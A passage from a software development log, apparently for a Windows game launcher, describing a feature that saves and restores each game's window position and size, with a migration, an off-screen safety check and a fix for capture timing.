persists it via a new `GameRepository.updateWindowRect()`, kept separate from the main edit-form
`update()` since this is system-captured state a user never directly edits.

Capture happens once, right before the session-end event fires (`remembered_window::capture`),
reading whatever the tracked window's position/size currently is - not just what was applied at
launch, so moving/resizing the window mid-session gets saved correctly. Captured *before*
reverting the fullscreen/always-on-top treatments (if either was also enabled for the same game),
since restoring those could itself move/resize the window and corrupt what gets saved.

Real edge case handled, not glossed over: a saved rect from a monitor that's since been
unplugged, or had its resolution changed, could place the window somewhere entirely unreachable.
`apply()` checks `MonitorFromRect` against the saved rect before ever calling `SetWindowPos` -
if it doesn't land on any currently-connected display, the saved rect is simply not applied,
leaving the window wherever the OS/game placed it by default instead of forcing it off-screen.

New `remember_window` + nullable `window_x`/`window_y`/`window_width`/`window_height` columns
(migration v10) - the four rect columns stay `NULL` until a session with this enabled has
actually ended and captured one, nothing to restore before that. Per-game opt-in, independent of
`pseudo_fullscreen`/`always_on_top` - any combination of the three treatments can be active for
the same game simultaneously.

### Milestone 39 stretch follow-up: fixed capture timing for remembered window

Real bug caught by the user's own question about capture ordering: `capture()` was only ever
called after exit was confirmed, and by that point the game's window is almost always already
destroyed (process cleanup tears down its own windows) - the feature silently saved nothing most
of the time it ran. Fixed by capturing periodically into a `last_known_rect` while the game is
still confirmed running, piggybacked on the exact same poll tick `refresh()` already uses for the
other two treatments - one extra cheap `GetWindowRect` call per existing tick, not a new
mechanism. Session end now falls back to that last successful read instead of relying on one
now-almost-certainly-too-late capture.

Explicitly considered and rejected doing *more* than this (e.g. a separate faster-polling timer
just for capture) - same "don't build more than the reference tool/the actual gap needs"
discipline as the pseudo-fullscreen resize-tracking scoping earlier. This one differs from that
case though: it's fixing a genuinely broken feature, not adding speculative robustness to a
working one - the fact that it now works at all is the point, not a nice-to-have refinement.

Also discussed (not acted on): whether saving *size* alongside position is worth it at all,
since most games already remember their own resolution/windowed setting internally. Concluded
the real value is position specifically (most games don't remember which monitor/desktop
position they were last at, especially on multi-monitor setups) - size is likely redundant in
practice but harmless to also restore, so left as one combined rect rather than narrowing scope.
